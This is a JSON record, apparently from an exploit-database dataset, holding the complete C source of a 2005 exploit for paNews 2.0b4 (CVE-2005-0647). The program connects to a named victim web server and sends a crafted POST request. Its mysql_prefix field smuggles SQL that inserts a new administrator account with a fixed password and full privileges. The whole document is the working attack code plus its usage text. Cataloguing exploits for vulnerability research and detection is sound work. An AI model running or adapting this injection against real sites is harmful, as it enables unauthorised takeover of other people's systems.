{
  "id": "866",
  "title": "paNews 2.0b4 - Remote Admin Creation SQL Injection",
  "cve": "CVE-2005-0647",
  "vuln_type": "sqli",
  "code": "/***************************************************\r\n*                                                  *\r\n* paNews v2.0b4                                    *\r\n*                                                  *\r\n* silePNEWSxpl                                     *\r\n* This exploit utilize SQL injection for create    *\r\n* a new user with admin privileges on paNews       *\r\n* software system.                                 *\r\n*                                                  *\r\n* References:                                      *\r\n* packetstormsecurity.org/0503-exploits/panews.txt *\r\n                         *\r\n*                                                  *\r\n* coded by: Silentium of Anacron Group Italy       *\r\n*     date: 04/03/2005                             *\r\n*   e-mail: anacrongroupitaly[at]autistici[dot]org *\r\n*  my_home: www.autistici.org/anacron-group-italy  *\r\n*                                                  *\r\n* this tool is developed under GPL license         *\r\n* no(c) .:. copyleft                               *\r\n*                                                  *\r\n***************************************************/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n\r\n#define PORT 80                 // port of the web server\r\n\r\nvoid info(void);\r\nvoid sendxpl(int sock, char *argv[]);\r\nvoid errsock(void);\r\nvoid errgeth(void);\r\nvoid errconn(void);\r\n\r\nint main(int argc, char *argv[]){\r\n\r\nint sock, sockconn;\r\nstruct sockaddr_in addr;\r\nstruct hostent *hp;\r\n\r\nif(argc!=4)\r\n  info();\r\n\r\nif((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)\r\n  errsock();\r\n\r\nsystem(\"clear\");\r\nprintf(\"[*] Creating socket             [OK]\\n\");\r\n\r\nif((hp = gethostbyname(argv[1])) == NULL)\r\n  errgeth();\r\n\r\nprintf(\"[*] Resolving victim host       [OK]\\n\");\r\n\r\nmemset(&addr,0,sizeof(addr));\r\nmemcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);\r\naddr.sin_family = AF_INET;\r\naddr.sin_port = htons(PORT);\r\n\r\nsockconn = connect(sock,(struct sockaddr *)&addr,sizeof(addr));\r\nif(sockconn < 0)\r\n  errsock();\r\n\r\nprintf(\"[*] Connecting at victim host   [OK]\\n\");\r\n\r\nsendxpl(sock, argv);\r\n\r\nprintf(\"[*] Now check on\\n\"\r\n      \"    http://%s%s\\n\\n\"\r\n      \"    your username: %s\\n\"\r\n      \"    with password: anacron\\n\\n\",argv[1],argv[2],argv[3]);\r\n\r\nshutdown(sock, 2);\r\nclose(sock);\r\n\r\nreturn(0);\r\n\r\n}\r\n\r\nvoid info(void){\r\n\r\nsystem(\"clear\");\r\nprintf(\"#########################################\\n\"\r\n      \"# paNews v2.0b4 exploit                 #\\n\"\r\n      \"#########################################\\n\"\r\n      \"# this exploit create a new user admin  #\\n\"\r\n      \"# on paNews software system.            #\\n\"\r\n      \"# exploit coded by Silentium            #\\n\"\r\n      \"# Anacron Group Italy                   #\\n\"\r\n      \"# www.autistici.org/anacron-group-italy #\\n\"\r\n      \"#########################################\\n\\n\"\r\n      \"[usage]\\n\\n\"\r\n      \" silePNEWSxpl <victim> <path_paNews> <username>\\n\\n\"\r\n      \"[example]\\n\\n\"\r\n      \" silePNEWSxpl www.victim.com /panews/index.php silentium\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\nvoid sendxpl(int sock, char *argv[]){\r\n\r\nFILE *out;\r\nint size = 264;\r\nout = fdopen(sock,\"a\");\r\nsetbuf(out,NULL);\r\n\r\nsize+=(strlen(argv[3]) * 2);\r\n\r\nfprintf(out,\"POST %s HTTP/1.0\\n\"\r\n           \"Connection: Keep-Alive\\n\"\r\n           \"Pragma: no-cache\\n\"\r\n           \"Cache-control: no-cache\\n\"\r\n           \"Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\\n\"\r\n           \"Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\\n\"\r\n           \"Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\\n\"\r\n           \"Accept-Language: en\\n\"\r\n           \"Host: %s\\n\"\r\n           \"Referer: http://%s%s\\n\"\r\n           \"Content-Type: application/x-www-form-urlencoded\\n\"\r\n           \"Content-Length: %d\\n\\n\"\r\n           \"action%%3Dlogin%%26username%%3D%s%%26password%%3Danacron%%26\"\r\n           \"mysql_prefix%%3Dpanews_auth%%60%%20VALUES%%20(%%22%%22,%%22\"\r\n           \"%s%%22,%%22f63140655b379e65f6cd87fa3c3da631%%22,%%22\"\r\n           \"hackit%%22,%%22admins%%7Ccat%%7Ccomment%%7Cnewsadd%%7Cnewsedit\"\r\n           \"%%7Cprefset%%7Csetup%%22,%%22none%%22,%%22127.0.0.1%%22\"\r\n           \",1,1)%%00\\n\\n\",argv[2],argv[1],argv[1],argv[2],size,argv[3],argv[3]);\r\n\r\n           printf(\"[*] Sending exploit         [OK]\\n\\n\");\r\n\r\n}\r\n\r\nvoid errsock(void){\r\n\r\nsystem(\"clear\");\r\nprintf(\"[x] Creating socket             [FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\nvoid errgeth(void){\r\n\r\nprintf(\"[x] Resolving victim host        [FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\nvoid errconn(void){\r\n\r\nprintf(\"[x] Connecting at victim host    [FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\n// milw0rm.com [2005-03-08]",
  "url": "https://www.exploit-db.com/exploits/866"
}